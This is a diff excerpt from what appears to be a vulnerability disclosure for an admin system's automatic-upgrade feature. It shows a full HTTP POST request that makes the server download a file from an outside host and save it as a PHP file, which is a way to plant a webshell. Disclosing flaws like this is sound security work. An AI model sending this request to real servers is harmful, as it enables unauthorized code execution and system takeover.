@@ -22,17 +22,29 @@ The vulnerability point is in the system - upgrade system - automatic upgrade
 ![image](https://user-images.githubusercontent.com/79570367/225641291-54c48afa-9e63-4b6d-93b9-bd4c121581dc.png)
 
 Packet:
+
 POST /admin_system/api.php HTTP/1.1
+
 Host: 192.168.57.1:81
+
 Accept: */*
+
 Accept-Encoding: gzip, deflate
+
 Origin: file://
+
 Accept-Language: zh-CN,en,*
+
 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+
 User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Safari/535.2 wke/1.0
+
 Content-Type: application/x-www-form-urlencoded
+
 Content-Length: 108
+
 Connection: close
+
 
 admin=admin&key=3ba2d1dbeb29f11cf2fb44b77c8d19c1&log=down&downurl=http://192.168.57.2/&filename=1.php
 
